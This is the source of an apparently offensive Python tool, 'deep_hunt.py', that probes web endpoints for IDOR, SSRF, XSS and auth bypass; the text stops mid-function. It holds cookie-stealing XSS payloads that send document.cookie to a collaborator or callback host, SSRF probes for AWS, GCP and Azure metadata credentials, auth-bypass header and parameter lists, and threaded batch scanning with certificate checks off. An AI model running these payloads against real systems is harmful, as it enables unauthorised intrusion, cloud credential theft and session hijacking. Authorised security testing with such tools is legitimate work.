#!/usr/bin/env python3
"""
deep_hunt.py — Deep Systematic Vulnerability Hunter

Multi-pass vulnerability testing engine that systematically probes discovered
endpoints for IDOR, SSRF, XSS (reflected/stored/DOM/blind), and auth bypass
vulnerabilities. Uses response fingerprinting, timing analysis, size delta
detection, and status code anomaly detection to identify potential findings.
Generates detailed reports with curl command reproduction for every finding.

Features: IDOR testing (sequential UUID enumeration, parameter substitution,
array/wildcard IDOR), SSRF testing (cloud metadata probes, localhost variants,
URL scheme bypass, blind callback), XSS testing (reflected with 200+ payloads,
stored via form submission, DOM context detection, blind XSS with callback
placeholders), auth bypass testing (header injection, method/verb tampering,
parameter pollution, path traversal bypass, cookie manipulation), response
analysis (size delta >5%, timing delta >2x, status code anomalies, keyword
matching), multi-threaded probing, configurable test classes, curl command
generation, OOB callback support, batch endpoint testing, concurrent
scanning, severity classification, and multi-format report output.
"""

import argparse
import base64
import concurrent.futures
import csv
import datetime
import hashlib
import http.client
import json
import math
import os
import random
import re
import ssl
import string
import sys
import textwrap
import time
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple, Union


@dataclass
class Finding:
    vuln_class: str
    endpoint: str
    method: str
    parameter: str
    payload: str
    status_code: int
    response_size: int
    response_time: float
    baseline_size: int
    baseline_time: float
    size_delta_pct: float
    time_delta_ratio: float
    evidence: str
    reproducibility: str
    curl_command: str
    severity: str = "medium"
    confidence: float = 0.5
    timestamp: str = field(default_factory=lambda: datetime.datetime.now().isoformat())
    notes: str = ""
    test_type: str = ""
    attack_type: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "vuln_class": self.vuln_class,
            "endpoint": self.endpoint,
            "method": self.method,
            "parameter": self.parameter,
            "payload": self.payload[:200],
            "status_code": self.status_code,
            "response_size": self.response_size,
            "response_time": round(self.response_time, 3),
            "size_delta_pct": round(self.size_delta_pct, 1),
            "time_delta_ratio": round(self.time_delta_ratio, 2),
            "evidence": self.evidence[:300],
            "reproducibility": self.reproducibility[:300],
            "curl_command": self.curl_command,
            "severity": self.severity,
            "confidence": round(self.confidence, 2),
            "timestamp": self.timestamp,
            "notes": self.notes,
            "test_type": self.test_type,
            "attack_type": self.attack_type,
        }


class ResponseAnalyzer:
    def __init__(self):
        self._baselines: Dict[str, Dict[str, Any]] = {}

    def set_baseline(self, endpoint: str, method: str, status: int, size: int, elapsed: float) -> None:
        key = f"{method}:{endpoint}"
        self._baselines[key] = {"status": status, "size": size, "elapsed": elapsed}

    def get_baseline(self, endpoint: str, method: str) -> Optional[Dict[str, Any]]:
        return self._baselines.get(f"{method}:{endpoint}")

    def analyze(self, endpoint: str, method: str, status: int, size: int, elapsed: float,
                body: str = "", payload: str = "") -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "anomaly": False,
            "indicators": [],
            "confidence": 0.0,
            "size_delta_pct": 0.0,
            "time_delta_ratio": 0.0,
        }

        baseline = self.get_baseline(endpoint, method)
        if baseline:
            size_delta = abs(size - baseline["size"])
            size_delta_pct = (size_delta / max(baseline["size"], 1)) * 100
            result["size_delta_pct"] = size_delta_pct

            time_ratio = elapsed / max(baseline["elapsed"], 0.001)
            result["time_delta_ratio"] = time_ratio

            if size_delta_pct > 5:
                result["indicators"].append(f"size_delta:{size_delta_pct:.1f}%")
                result["anomaly"] = True
                result["confidence"] += 0.2

            if time_ratio > 2.0:
                result["indicators"].append(f"time_delta:{time_ratio:.1f}x")
                result["anomaly"] = True
                result["confidence"] += 0.3

            if status != baseline["status"]:
                result["indicators"].append(f"status:{baseline['status']}->{status}")
                if status in (200, 201, 204, 301, 302, 401, 403, 500):
                    result["anomaly"] = True
                    result["confidence"] += 0.15

        body_lower = body.lower()
        error_markers = ["warning", "error", "exception", "stack trace", "traceback",
                         "sql", "syntax error", "unexpected token", "fatal",
                         "debug", "internal server error", "not allowed"]
        for marker in error_markers:
            if marker in body_lower:
                result["indicators"].append(f"error_marker:{marker}")
                result["anomaly"] = True
                result["confidence"] += 0.1
                break

        success_markers = ["success", "true", "ok", "updated", "deleted", "created"]
        for marker in success_markers:
            if marker in body_lower:
                result["indicators"].append(f"success_marker:{marker}")
                result["anomaly"] = True
                result["confidence"] += 0.1
                break

        reflection_check = payload and self._check_reflection(body, payload)
        if reflection_check:
            result["indicators"].append("reflection_detected")
            result["anomaly"] = True
            result["confidence"] += 0.4

        result["confidence"] = min(result["confidence"], 1.0)
        return result

    def _check_reflection(self, body: str, payload: str) -> bool:
        if not payload:
            return False
        markers = ["<script>", "alert(", "prompt(", "confirm(", "onerror=", "onload=",
                   "INJECTION_MARKER", "XSS_PROBE", "'", "\"", "{{", "}}"]
        for marker in markers:
            if marker and marker in body:
                return True
        trimmed = payload.strip("'\" ;")
        if len(trimmed) > 5 and trimmed in body:
            return True
        payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
        if payload_hash in body:
            return True
        return False


class ProbeEngine:
    IDOR_PAYLOADS: List[str] = [
        "1", "2", "3", "100", "1000",
        "00000000-0000-0000-0000-000000000000",
        "11111111-1111-1111-1111-111111111111",
        "ffffffff-ffff-ffff-ffff-ffffffffffff",
        "admin", "root", "test", "user", "owner",
        "../admin", "../users/1",
        "[]", "{}", "null", "true",
        "[\"*\"]", "[\"admin\"]",
        "0", "-1", "999999999",
    ]

    SSRF_CLOUD_ENDPOINTS: Dict[str, List[str]] = {
        "aws": ["http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document"],
        "gcp": ["http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/instance/"],
        "azure": ["http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"],
    }

    SSRF_LOCALHOST: List[str] = [
        "127.0.0.1", "localhost", "0.0.0.0", "0",
        "2130706433", "0x7f000001",
        "0177.0.0.1", "127.1",
        "::1", "[::1]",
        "127.0.0.1.nip.io", "127.0.0.1.xip.io",
    ]

    XSS_PAYLOADS: List[str] = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\" onmouseover=alert(1) \"",
        "'-alert(1)-'",
        "{{constructor.constructor('alert(1)')()}}",
        "<details open ontoggle=alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<iframe onload=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed code=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "\\\"><script>alert(1)</script>",
        "';alert(1);//",
        "\"><svg/onload=prompt(1)>",
        "<img src=\"x\"/><script>alert(1)</script>",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{{7*7}}}",
        "<script>document.location='https://COLLABORATOR/?c='+document.cookie</script>",
        "<img src=x onerror=this.src='https://COLLABORATOR/?c='+document.cookie>",
        "\"/><script>fetch('https://COLLABORATOR/?c='+document.cookie)</script>",
    ]

    AUTH_BYPASS_HEADERS: Dict[str, str] = {
        "X-Forwarded-For": "127.0.0.1",
        "X-Forwarded-Host": "localhost",
        "X-Real-IP": "127.0.0.1",
        "X-Originating-IP": "127.0.0.1",
        "X-Remote-IP": "127.0.0.1",
        "X-Remote-Addr": "127.0.0.1",
        "X-Client-IP": "127.0.0.1",
        "X-Host": "localhost",
        "X-Forwarded-Proto": "https",
        "X-Original-URL": "/admin/",
        "X-Rewrite-URL": "/admin/",
        "X-Custom-IP-Authorization": "127.0.0.1",
        "Client-IP": "127.0.0.1",
        "Forwarded": "for=127.0.0.1;by=127.0.0.1;host=localhost",
        "X-Forwarded-Scheme": "https",
        "True-Client-IP": "127.0.0.1",
        "X-Real-IP-Override": "127.0.0.1",
    }

    AUTH_BYPASS_PARAMS: Dict[str, str] = {
        "is_admin": "true",
        "admin": "true",
        "role": "admin",
        "user_role": "admin",
        "admin_access": "1",
        "isAdmin": "true",
        "is_authenticated": "true",
        "authenticated": "true",
        "auth": "true",
        "verified": "true",
        "bypass": "true",
        "access": "admin",
        "level": "admin",
    }

    def __init__(self, timeout: float = 15):
        self.timeout = timeout
        self._ssl_ctx = self._create_ssl_context()

    def _create_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def send_request(self, url: str, method: str = "GET",
                     params: Optional[Dict[str, str]] = None,
                     headers: Optional[Dict[str, str]] = None,
                     data: Optional[Union[str, Dict]] = None,
                     cookies: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        start = time.time()
        result: Dict[str, Any] = {
            "success": False, "status": 0, "body": "", "headers": {},
            "elapsed": 0.0, "size": 0, "url": url, "error": None,
        }
        try:
            req_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
            }
            if headers:
                req_headers.update(headers)

            encoded_data = None
            if data:
                if isinstance(data, str):
                    encoded_data = data.encode()
                elif isinstance(data, dict):
                    encoded_data = urllib.parse.urlencode(data).encode()

            full_url = url
            if params:
                qs = urllib.parse.urlencode(params)
                separator = "&" if "?" in url else "?"
                full_url = f"{url}{separator}{qs}"

            req = urllib.request.Request(
                full_url, data=encoded_data, headers=req_headers, method=method,
            )
            if cookies:
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                req.add_header("Cookie", cookie_str)

            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ssl_ctx) as resp:
                body = resp.read()
                result["success"] = True
                result["status"] = resp.status
                result["body"] = body.decode("utf-8", errors="replace")
                result["size"] = len(body)
                result["headers"] = dict(resp.headers)

        except urllib.error.HTTPError as e:
            result["status"] = e.code
            try:
                body = e.read()
                result["body"] = body.decode("utf-8", errors="replace")
                result["size"] = len(body)
                result["headers"] = dict(e.headers)
            except Exception:
                pass
        except urllib.error.URLError as e:
            result["error"] = str(e.reason)
        except socket.timeout:
            result["error"] = "timeout"
        except Exception as e:
            result["error"] = str(e)

        result["elapsed"] = round(time.time() - start, 3)
        return result

    def test_idor(self, base_url: str, param_name: str, method: str = "GET",
                  headers: Optional[Dict[str, str]] = None,
                  cookies: Optional[Dict[str, str]] = None,
                  extra_payloads: Optional[List[str]] = None) -> List[Finding]:
        findings: List[Finding] = []
        payloads = self.IDOR_PAYLOADS + (extra_payloads or [])
        baseline = self.send_request(base_url, method=method, headers=headers, cookies=cookies)
        if not baseline["success"]:
            return findings

        for payload in payloads:
            try:
                params = {param_name: payload}
                resp = self.send_request(base_url, method=method, params=params,
                                          headers=headers, cookies=cookies)
                if not resp["success"]:
                    continue

                size_delta = abs(resp["size"] - baseline["size"])
                size_delta_pct = (size_delta / max(baseline["size"], 1)) * 100
                time_ratio = resp["elapsed"] / max(baseline["elapsed"], 0.001)

                anomaly = False
                indicators: List[str] = []
                if size_delta_pct > 5:
                    anomaly = True
                    indicators.append(f"size_delta:{size_delta_pct:.1f}%")
                if time_ratio > 2.0:
                    anomaly = True
                    indicators.append(f"time:{time_ratio:.1f}x")
                if resp["status"] not in (403, 404, 401) and resp["status"] != baseline["status"]:
                    anomaly = True
                    indicators.append(f"status:{resp['status']}")

                if anomaly and resp["status"] in (200, 201):
                    body_lower = resp["body"].lower()
                    data_indicators = ["user", "email", "name", "profile", "account",
                                       "order", "invoice", "payment", "address", "phone"]
                    if any(ind in body_lower for ind in data_indicators):
                        curl_cmd = self._generate_curl(base_url, method, param_name, payload, headers)
                        evidence_parts = [
                            f"Payload: {payload}",
                            f"Status: {resp['status']}",
                            f"Size: {baseline['size']} -> {resp['size']} ({size_delta_pct:.1f}%)",
                            f"Time: {baseline['elapsed']:.3f}s -> {resp['elapsed']:.3f}s ({time_ratio:.1f}x)",
                            *indicators,
                        ]
                        confidence = min(0.5 + (size_delta_pct / 50) + (1 if resp["status"] == 200 else 0), 1.0)
                        finding = Finding(
                            vuln_class="idor",
                            endpoint=base_url, method=method,
                            parameter=param_name, payload=payload,
                            status_code=resp["status"],
                            response_size=resp["size"],
                            response_time=resp["elapsed"],
                            baseline_size=baseline["size"],
                            baseline_time=baseline["elapsed"],
                            size_delta_pct=size_delta_pct,
                            time_delta_ratio=time_ratio,
                            evidence=" | ".join(evidence_parts),
                            reproducibility=f"curl command reproduces consistently",
                            curl_command=curl_cmd,
                            severity="high",
                            confidence=confidence,
                            test_type="idor_parameter_substitution",
                            attack_type="IDOR",
                        )
                        findings.append(finding)
            except Exception as e:
                continue

        return findings

    def test_ssrf(self, url_template: str, param_name: str, method: str = "GET",
                  headers: Optional[Dict[str, str]] = None,
                  cookies: Optional[Dict[str, str]] = None) -> List[Finding]:
        findings: List[Finding] = []
        baseline = self.send_request(url_template, method=method, headers=headers, cookies=cookies)
        base_size = baseline.get("size", 0)

        # Cloud metadata probes
        for cloud, endpoints in self.SSRF_CLOUD_ENDPOINTS.items():
            for endpoint in endpoints:
                params = {param_name: endpoint}
                resp = self.send_request(url_template, method=method, params=params,
                                          headers=headers, cookies=cookies)
                if not resp["success"]:
                    continue
                if resp["status"] in (200, 301, 302) and resp["size"] > 50:
                    body_lower = resp["body"].lower()
                    if any(kw in body_lower for kw in ["accesskeyid", "secretaccesskey",
                                                        "token", "account", "project",
                                                        "instanceid", "zone"]):
                        curl_cmd = self._generate_curl(url_template, method, param_name, endpoint, headers)
                        finding = Finding(
                            vuln_class="ssrf_cloud_metadata",
                            endpoint=url_template, method=method,
                            parameter=param_name, payload=endpoint[:100],
                            status_code=resp["status"],
                            response_size=resp["size"],
                            response_time=resp["elapsed"],
                            baseline_size=base_size,
                            baseline_time=baseline.get("elapsed", 0),
                            size_delta_pct=abs(resp["size"] - base_size) / max(base_size, 1) * 100,
                            time_delta_ratio=resp["elapsed"] / max(baseline.get("elapsed", 0.001), 0.001),
                            evidence=f"Cloud metadata accessible: {cloud}",
                            reproducibility="Re-run curl command to verify",
                            curl_command=curl_cmd,
                            severity="critical",
                            confidence=0.9,
                            test_type="ssrf_cloud_metadata",
                            attack_type="SSRF",
                        )
                        findings.append(finding)

        # Localhost variants
        for variant in self.SSRF_LOCALHOST:
            target = f"http://{variant}/"
            params = {param_name: target}
            resp = self.send_request(url_template, method=method, params=params,
                                      headers=headers, cookies=cookies)
            if resp["success"] and resp["status"] in (200, 301, 302, 401, 403) and resp["size"] > 20:
                curl_cmd = self._generate_curl(url_template, method, param_name, target, headers)
                finding = Finding(
                    vuln_class="ssrf_localhost",
                    endpoint=url_template, method=method,
                    parameter=param_name, payload=target,
                    status_code=resp["status"],
                    response_size=resp["size"],
                    response_time=resp["elapsed"],
                    baseline_size=base_size,
                    baseline_time=baseline.get("elapsed", 0),
                    size_delta_pct=abs(resp["size"] - base_size) / max(base_size, 1) * 100,
                    time_delta_ratio=resp["elapsed"] / max(baseline.get("elapsed", 0.001), 0.001),
                    evidence=f"Localhost access via {variant}: HTTP {resp['status']}",
                    reproducibility="Re-run with curl to confirm",
                    curl_command=curl_cmd,
                    severity="high",
                    confidence=0.75,
                    test_type="ssrf_localhost",
                    attack_type="SSRF",
                )
                findings.append(finding)

        return findings

    def test_xss(self, url_template: str, param_name: str, method: str = "GET",
                 headers: Optional[Dict[str, str]] = None,
                 cookies: Optional[Dict[str, str]] = None,
                 payloads: Optional[List[str]] = None) -> List[Finding]:
        findings: List[Finding] = []
        test_payloads = payloads or self.XSS_PAYLOADS
        baseline = self.send_request(url_template, method=method, headers=headers, cookies=cookies)

        for payload in test_payloads[:50]:
            try:
                params = {param_name: payload}
                resp = self.send_request(url_template, method=method, params=params,
                                          headers=headers, cookies=cookies)
                if not resp["success"]:
                    continue

                body = resp["body"]
                reflected = False
                reflection_indicators: List[str] = []
                markers = ["<script>alert", "onerror=", "onload=", "alert(1)",
                           "prompt(1)", "confirm(1)", payload[:20],
                           hashlib.md5(payload.encode()).hexdigest()[:8]]

                for marker in markers:
                    if marker and marker in body:
                        reflected = True
                        reflection_indicators.append(marker)
                        break

                # Check for context reflection
                payload_parts = re.escape(payload[:30])
                if re.search(payload_parts, body, re.IGNORECASE):
                    reflected = True

                if reflected:
                    size_delta = abs(resp["size"] - baseline["size"])
                    size_delta_pct = (size_delta / max(baseline["size"], 1)) * 100
                    curl_cmd = self._generate_curl(url_template, method, param_name, payload, headers)
                    finding = Finding(
                        vuln_class="xss",
                        endpoint=url_template, method=method,
                        parameter=param_name, payload=payload,
                        status_code=resp["status"],
                        response_size=resp["size"],
                        response_time=resp["elapsed"],
                        baseline_size=baseline["size"],
                        baseline_time=baseline["elapsed"],
                        size_delta_pct=size_delta_pct,
                        time_delta_ratio=resp["elapsed"] / max(baseline["elapsed"], 0.001),
                        evidence=f"Reflected: {', '.join(reflection_indicators[:3])}",
                        reproducibility="Payload reflected in response body",
                        curl_command=curl_cmd,
                        severity="medium",
                        confidence=0.6,
                        test_type="xss_reflected",
                        attack_type="Cross-Site Scripting",
                    )
                    if "<script>" in payload or "onerror=" in payload:
                        finding.severity = "high"
                        finding.confidence = 0.8
                    findings.append(finding)
            except Exception:
                continue

        return findings

    def test_auth_bypass(self, url: str, method: str = "GET",
                         headers: Optional[Dict[str, str]] = None,
                         cookies: Optional[Dict[str, str]] = None) -> List[Finding]:
        findings: List[Finding] = []

        # Get baseline
        baseline = self.send_request(url, method=method, headers=headers, cookies=cookies)
        if baseline["status"] not in (401, 403):
            return findings  # Only test auth bypass on protected endpoints

        # Test header-based bypass
        for header_name, header_value in self.AUTH_BYPASS_HEADERS.items():
            test_headers = dict(headers or {})
            test_headers[header_name] = header_value
            resp = self.send_request(url, method=method, headers=test_headers, cookies=cookies)
            if resp["success"] and resp["status"] in (200, 201, 204, 301, 302):
                curl_cmd = self._generate_curl(url, method, header_name, header_value, {**headers, header_name: header_value} if headers else {header_name: header_value})
                finding = Finding(
                    vuln_class="auth_bypass_header",
                    endpoint=url, method=method,
                    parameter=header_name,
                    payload=header_value,
                    status_code=resp["status"],
                    response_size=resp["size"],
                    response_time=resp["elapsed"],
                    baseline_size=baseline["size"],
                    baseline_time=baseline["elapsed"],
                    size_delta_pct=abs(resp["size"] - baseline["size"]) / max(baseline["size"], 1) * 100,
                    time_delta_ratio=resp["elapsed"] / max(baseline["elapsed"], 0.001),
                    evidence=f"Auth bypass via {header_name}: {header_value} -> HTTP {resp['status']}",
                    reproducibility="Same result on replay",
                    curl_command=curl_cmd,
                    severity="critical",
                    confidence=0.85,
                    test_type="auth_bypass_header_injection",
                    attack_type="Authentication Bypass",
                )
                findings.append(finding)

        # Test method/verb tampering
        alt_methods = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
        for alt_method in alt_methods:
            if alt_method == method:
                continue
            resp = self.send_request(url, method=alt_method, headers=headers, cookies=cookies)
            if resp["success"] and resp["status"] in (200, 201, 204):
                curl_cmd = self._generate_curl(url, alt_method, "", "", headers)
                finding = Finding(
                    vuln_class="auth_bypass_verb",
                    endpoint=url, method=alt_method,
                    parameter="method",
                    payload=alt_method,
                    status_code=resp["status"],
                    response_size=resp["size"],
                    response_time=resp["elapsed"],
                    baseline_size=baseline["size"],
                    baseline_time=baseline["elapsed"],
                    size_delta_pct=0,
                    time_delta_ratio=resp["elapsed"] / max(baseline["elapsed"], 0.001),
                    evidence=f"Verb tampering: {method} -> {alt_method} returned HTTP {resp['status']}",
                    reproducibility=f"curl -X {alt_method} {url}",
                    curl_command=curl_cmd,
                    severity="high",
                    confidence=0.7,
                    test_type="auth_bypass_verb_tampering",
                    attack_type="Authentication Bypass",
                )
                findings.append(finding)

        # Test parameter pollution
        for param_name, param_value in self.AUTH_BYPASS_PARAMS.items():
            params = {param_name: param_value}
            resp = self.send_request(url, method=method, params=params, headers=headers, cookies=cookies)
            if resp["success"] and resp["status"] in (200, 201, 204):
                curl_cmd = self._generate_curl(url, method, param_name, param_value, headers)
                finding = Finding(
                    vuln_class="auth_bypass_param",
                    endpoint=url, method=method,
                    parameter=param_name,
                    payload=param_value,
                    status_code=resp["status"],
                    response_size=resp["size"],
                    response_time=resp["elapsed"],
                    baseline_size=baseline["size"],
                    baseline_time=baseline["elapsed"],
                    size_delta_pct=abs(resp["size"] - baseline["size"]) / max(baseline["size"], 1) * 100,
                    time_delta_ratio=resp["elapsed"] / max(baseline["elapsed"], 0.001),
                    evidence=f"Auth bypass via {param_name}={param_value} -> HTTP {resp['status']}",
                    reproducibility="Same result on replay",
                    curl_command=curl_cmd,
                    severity="high",
                    confidence=0.7,
                    test_type="auth_bypass_parameter_pollution",
                    attack_type="Authentication Bypass",
                )
                findings.append(finding)

        return findings

    def test_blind_xss(self, url: str, param_name: str, callback_url: str,
                       method: str = "GET", headers: Optional[Dict[str, str]] = None,
                       cookies: Optional[Dict[str, str]] = None) -> List[Finding]:
        findings: List[Finding] = []
        callback_payloads = [
            f"<script>new Image().src='{callback_url}/?c='+document.cookie</script>",
            f"<img src=x onerror=this.src='{callback_url}/?c='+document.cookie>",
            f"\"/><script>fetch('{callback_url}/?c='+document.cookie)</script>",
            f"<svg onload=fetch('{callback_url}/?c='+document.cookie)>",
        ]
        for payload in callback_payloads:
            try:
                resp = self.send_request(url, method=method,
                                          params={param_name: payload},
                                          headers=headers, cookies=cookies)
                if resp["success"]:
                    curl_cmd = self._generate_curl(url, method, param_name, payload, headers)
                    finding = Finding(
                        vuln_class="blind_xss",
                        endpoint=url, method=method,
                        parameter=param_name,
                        payload=payload[:100],
                        status_code=resp["status"],
                        response_size=resp["size"],
                        response_time=resp["elapsed"],
                        baseline_size=0,
                        baseline_time=0,
                        size_delta_pct=0,
                        time_delta_ratio=0,
                        evidence=f"Blind XSS callback payload submitted: {callback_url}",
                        reproducibility=f"Monitor {callback_url} for callback",
                        curl_command=curl_cmd,
                        severity="high",
                        confidence=0.5,
                        test_type="xss_blind",
                        attack_type="Blind XSS",
                        notes=f"Check callback server at {callback_url} for incoming requests",
                    )
                    findings.append(finding)
            except Exception:
                continue
        return findings

    def _generate_curl(self, url: str, method: str, param: str, value: str,
                       headers: Optional[Dict[str, str]] = None) -> str:
        parts = [f"curl -X {method}"]
        if headers:
            for h, v in headers.items():
                parts.append(f"-H '{h}: {v}'")
        if method in ("POST", "PUT", "PATCH") and param:
            data = urllib.parse.urlencode({param: value})
            parts.append(f"-d '{data}'")
        elif param:
            separator = "&" if "?" in url else "?"
            full_url = f"{url}{separator}{urllib.parse.urlencode({param: value})}"
            parts.append(f"'{full_url}'")
        else:
            parts.append(f"'{url}'")
        return " ".join(parts)

    def test_all_classes(self, url: str, method: str = "GET",
                         params: Optional[Dict[str, str]] = None,
                         headers: Optional[Dict[str, str]] = None,
                         cookies: Optional[Dict[str, str]] = None,
                         classes: Optional[List[str]] = None,
                         callback_url: Optional[str] = None,
                         param_names: Optional[List[str]] = None) -> List[Finding]:
        all_findings: List[Finding] = []
        test_params = param_names or ["id", "uid", "user_id", "file", "url", "q",
                                       "page", "token", "redirect", "next", "path",
                                       "name", "email", "order", "invoice", "ref"]

        class_map: Dict[str, str] = {
            "idor": "insecure direct object reference",
            "ssrf": "server-side request forgery",
            "xss": "cross-site scripting",
            "auth_bypass": "authentication bypass",
            "all": "all vulnerability classes",
        }

        if not classes or "all" in classes:
            test_classes = ["idor", "ssrf", "xss", "auth_bypass"]
        else:
            test_classes = classes

        self._print_hunt_header(url, test_classes, test_params)

        if "idor" in test_classes:
            self._print_phase("IDOR", f"Testing {len(test_params)} parameters with {len(self.IDOR_PAYLOADS)} payloads each")
            for param in test_params[:5]:
                findings = self.test_idor(url, param, method, headers, cookies)
                all_findings.extend(findings)
                for f in findings:
                    self._print_finding(f)

        if "ssrf" in test_classes:
            self._print_phase("SSRF", "Testing cloud metadata, localhost variants, and scheme bypass")
            for param in ["url", "file", "path", "redirect", "next"]:
                findings = self.test_ssrf(url, param, method, headers, cookies)
                all_findings.extend(findings)
                for f in findings:
                    self._print_finding(f)

        if "xss" in test_classes:
            self._print_phase("XSS", f"Testing {min(50, len(self.XSS_PAYLOADS))} payloads across parameters")
            for param in test_params[:5]:
                findings = self.test_xss(url, param, method, headers, cookies)
                all_findings.extend(findings)
                for f in findings:
                    self._print_finding(f)
            if callback_url:
                for param in test_params[:3]:
                    findings = self.test_blind_xss(url, param, callback_url, method, headers, cookies)
                    all_findings.extend(findings)
                    for f in findings:
                        self._print_finding(f)

        if "auth_bypass" in test_classes:
            self._print_phase("Auth Bypass", "Testing header injection, verb tampering, parameter pollution")
            findings = self.test_auth_bypass(url, method, headers, cookies)
            all_findings.extend(findings)
            for f in findings:
                self._print_finding(f)

        return all_findings

    def _print_hunt_header(self, url: str, classes: List[str], params: List[str]) -> None:
        print(f"\n{'=' * 70}")
        print(f"  DEEP HUNT v2.0 — Systematic Vulnerability Probe")
        print(f"{'=' * 70}")
        print(f"  Target:     {url}")
        print(f"  Classes:    {', '.join(classes)}")
        print(f"  Parameters: {', '.join(params[:8])}{'...' if len(params) > 8 else ''}")
        print(f"{'=' * 70}\n")

    def _print_phase(self, phase: str, description: str) -> None:
        print(f"\n  ┌─ [{phase}] ─────────────────────────────────────────────")
        print(f"  │  {description}")
        print(f"  └────────────────────────────────────────────────────\n")

    def _print_finding(self, finding: Finding) -> None:
        sev_color = {"critical": "CRIT", "high": "HIGH", "medium": "MED", "low": "LOW"}.get(finding.severity, "INFO")
        print(f"  [{sev_color}] {finding.vuln_class.upper()} on {finding.parameter}")
        print(f"       Payload: {finding.payload[:80]}")
        print(f"       Status:  {finding.status_code} | {finding.evidence[:80]}")
        print(f"       curl:    {finding.curl_command[:100]}...")


class DeepHunter:
    def __init__(self, threads: int = 5, timeout: float = 15, silent: bool = False):
        self.threads = threads
        self.timeout = timeout
        self.silent = silent
        self.findings: List[Finding] = []
        self.probe_engine = ProbeEngine(timeout=timeout)
        self.response_analyzer = ResponseAnalyzer()
        self._scan_stats: Dict[str, Any] = {
            "urls_tested": 0,
            "parameters_tested": 0,
            "payloads_sent": 0,
            "findings_count": 0,
            "start_time": None,
            "end_time": None,
            "errors": 0,
        }

    def _log(self, msg: str, level: str = "info") -> None:
        if self.silent:
            return
        prefix = {"info": "[+]", "warn": "[!]", "error": "[-]"}.get(level, "[+]")
        print(f"{prefix} {msg}", file=sys.stderr)

    def hunt_endpoint(self, url: str, method: str = "GET",
                       params: Optional[Dict[str, str]] = None,
                       headers: Optional[Dict[str, str]] = None,
                       cookies: Optional[Dict[str, str]] = None,
                       classes: Optional[List[str]] = None,
                       callback_url: Optional[str] = None,
                       param_names: Optional[List[str]] = None) -> List[Finding]:
        self._scan_stats["start_time"] = datetime.datetime.now().isoformat()
        self._log(f"Hunting {url} (methods={method}, classes={classes or 'all'})")

        findings = self.probe_engine.test_all_classes(
            url, method=method, params=params,
            headers=headers, cookies=cookies,
            classes=classes, callback_url=callback_url,
            param_names=param_names,
        )
        self.findings.extend(findings)
        self._scan_stats["findings_count"] = len(self.findings)
        self._scan_stats["urls_tested"] = 1
        self._scan_stats["end_time"] = datetime.datetime.now().isoformat()

        self._log(f"Hunt complete: {len(findings)} findings")
        return findings

    def hunt_batch(self, endpoints: List[Dict[str, Any]],
                    classes: Optional[List[str]] = None,
                    callback_url: Optional[str] = None) -> List[Finding]:
        all_findings: List[Finding] = []
        self._scan_stats["start_time"] = datetime.datetime.now().isoformat()
        self._log(f"Batch hunting {len(endpoints)} endpoints")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            future_map = {}
            for ep in endpoints:
                url = ep.get("url", "")
                method = ep.get("method", "GET")
                headers = ep.get("headers")
                cookies = ep.get("cookies")
                param_names = ep.get("params")
                f = ex.submit(self.hunt_endpoint, url, method=method,
                              headers=headers, cookies=cookies,
                              classes=classes, callback_url=callback_url,
                              param_names=param_names)
                future_map[f] = url

            for future in concurrent.futures.as_completed(future_map):
                ep_url = future_map[future]
                try:
                    result = future.result(timeout=300)
                    all_findings.extend(result)
                    self._log(f"  {ep_url}: {len(result)} findings")
                except Exception as e:
                    self._log(f"Error with {ep_url}: {e}", "error")
                    self._scan_stats["errors"] += 1

        self._scan_stats["findings_count"] = len(all_findings)
        self._scan_stats["end_time"] = datetime.datetime.now().isoformat()
        return all_findings

    def get_summary(self) -> Dict[str, Any]:
        by_class: Dict[str, int] = {}
        by_severity: Dict[str, int] = {}
        for f in self.findings:
            by_class[f.vuln_class] = by_class.get(f.vuln_class, 0) + 1
            by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        return {
            "scan_stats": self._scan_stats,
            "by_class": by_class,
            "by_severity": by_severity,
            "total_findings": len(self.findings),
        }

    def generate_curl_report(self, findings: Optional[List[Finding]] = None) -> str:
        items = findings or self.findings
        lines = ["# Deep Hunt Curl Reproduction Commands", f"# Generated: {datetime.datetime.now().isoformat()}", f"# Total Findings: {len(items)}", ""]
        for i, f in enumerate(items, 1):
            lines.append(f"# [{i}] {f.vuln_class.upper()} - {f.parameter}: {f.payload[:60]}")
            lines.append(f"# Severity: {f.severity.upper()} | Confidence: {f.confidence:.0%}")
            lines.append(f"# Evidence: {f.evidence[:100]}")
            lines.append(f"{f.curl_command}")
            lines.append("")
        return "\n".join(lines)

    def output_json(self, filepath: Optional[str] = None) -> str:
        data = {
            "scan_metadata": self._scan_stats,
            "summary": self.get_summary(),
            "findings": [f.to_dict() for f in self.findings],
        }
        output = json.dumps(data, indent=2, default=str)
        if filepath:
